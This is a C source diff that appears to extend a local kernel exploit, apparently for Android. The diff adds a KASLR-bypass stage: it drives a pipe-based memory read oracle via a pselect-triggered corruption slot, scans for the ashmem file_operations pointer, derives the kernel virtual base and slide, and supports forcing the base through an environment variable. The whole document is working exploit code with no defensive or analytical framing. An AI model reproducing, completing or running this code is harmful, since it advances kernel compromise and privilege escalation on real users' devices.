@@ -42,8 +42,30 @@ static atomic_int slide_consumer_ready;
 static atomic_int slide_pselect_write_window;
 static int slide_pselect_nfds = PSELECT_ROUTE_NFDS;
 static int slide_syscall_pad;
+int p0_virtual_base_probe;
 
 static int slide_commit_stext(uint64_t stext, const char *source);
+
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+static int slide_commit_virtual_base(uint64_t base, const char *source) {
+  if ((base >> 48) != 0xffff || (base & 0x1fffffULL) != 0 ||
+      base < KIMAGE_VIRTUAL_BASE_MIN || base > KIMAGE_VIRTUAL_BASE_MAX ||
+      base > UINT64_MAX - ASHMEM_FOPS_OFF) {
+    pr_warning("virtual base rejected source=%s base=%016llx\n",
+               source, (unsigned long long)base);
+    return 0;
+  }
+  kaslr_base = base;
+  kaslr_slide = base - KIMAGE_TEXT_BASE;
+  kaslr_done = 1;
+  app_publish_p0_offset(slide_p0_offset);
+  pr_success("slide-kaslr-ok source=%s pid=%d base=%016llx "
+             "virtual_slide=%016llx p0_offset=%08zx\n",
+             source, getpid(), (unsigned long long)kaslr_base,
+             (unsigned long long)kaslr_slide, slide_p0_offset);
+  return 1;
+}
+#endif
 
 static useconds_t slide_enter_delay_usec(void) {
   const char *forced = getenv("SLIDE_ENTER_DELAY_USEC");
@@ -665,6 +687,11 @@ static int slide_trigger_physical_slot(size_t slot) {
 #if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
     delay = slide_physical_slot_delays[(size_t)(attempt - 1)];
 #endif
+#if defined(SLIDE_VIRTUAL_BASE_DELAY_USEC)
+    if (p0_virtual_base_probe) {
+      delay = SLIDE_VIRTUAL_BASE_DELAY_USEC;
+    }
+#endif
     char delay_arg[16];
     slide_pselect_nfds = PSELECT_ROUTE_NFDS;
     slide_syscall_pad = 0;
@@ -779,6 +806,69 @@ static int slide_leak_physical_base(void) {
   pr_success("p0 physical elapsed_ms=%zu\n", elapsed_ms);
   return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
 }
+
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+static int slide_leak_virtual_base(uintptr_t physical_offset) {
+  size_t started = gettime_ns();
+  uint64_t ashmem_fops = 0;
+  int gate_result = 0;
+  int restore_needed = 0;
+  int restore_ok = 0;
+  int success = 0;
+  slide_p0_offset = physical_offset;
+  p0_virtual_base_probe = 1;
+
+  if (!prepare_p0_pipe_oracle()) {
+    pr_error("p0 virtual pipe preparation failed\n");
+    goto out;
+  }
+  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+  if (!page_base) {
+    goto out;
+  }
+  /* Any attempted rt_mutex write makes this supervisor attempt non-retryable. */
+  app_publish_p0_dirty();
+  if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
+    pr_error("p0 virtual pipe gate trigger failed\n");
+    goto out;
+  }
+  gate_result = verify_p0_pipe_oracle_gate();
+  if (gate_result != 1) {
+    pr_error("p0 virtual pipe reclaim gate=%d\n", gate_result);
+    if (gate_result != 0) {
+      restore_needed = 1;
+    }
+    goto out;
+  }
+  restore_needed = 1;
+  if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
+    goto out;
+  }
+  ashmem_fops = scan_p0_virtual_base_pointer();
+
+out:
+  if (restore_needed) {
+    restore_ok = slide_restore_physical_oracle();
+  }
+  p0_virtual_base_probe = 0;
+  if (!restore_ok || ashmem_fops <= ASHMEM_FOPS_OFF) {
+    return 0;
+  }
+
+  uint64_t base = ashmem_fops - ASHMEM_FOPS_OFF;
+  if (base > UINT64_MAX - ASHMEM_FOPS_OFF ||
+      base + ASHMEM_FOPS_OFF != ashmem_fops) {
+    return 0;
+  }
+  size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
+  pr_success("p0 virtual elapsed_ms=%zu ashmem_fops=%016llx "
+             "base=%016llx\n", elapsed_ms,
+             (unsigned long long)ashmem_fops,
+             (unsigned long long)base);
+  success = slide_commit_virtual_base(base, "physical-data");
+  return success;
+}
+#endif
 
 static void dump_p0_oracle_words(int fd, const char *phase,
                                  uintptr_t address, size_t count) {
@@ -991,7 +1081,25 @@ int slide_leak_kernel_base(void) {
       }
     }
     pr_info("slide forced p0 offset=%08llx\n", value);
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+    const char *virtual_base_arg = getenv("SLIDE_VIRTUAL_BASE");
+    if (virtual_base_arg && *virtual_base_arg) {
+      char *base_end = NULL;
+      errno = 0;
+      unsigned long long virtual_base =
+          strtoull(virtual_base_arg, &base_end, 0);
+      slide_p0_offset = (uintptr_t)value;
+      if (errno || base_end == virtual_base_arg || *base_end ||
+          !slide_commit_virtual_base(virtual_base, "forced-virtual")) {
+        pr_error("slide invalid forced virtual base=%s\n", virtual_base_arg);
+        return 0;
+      }
+      return 1;
+    }
+    return slide_leak_virtual_base((uintptr_t)value);
+#else
     return slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
+#endif
   }
   return slide_leak_physical_base();
 #else
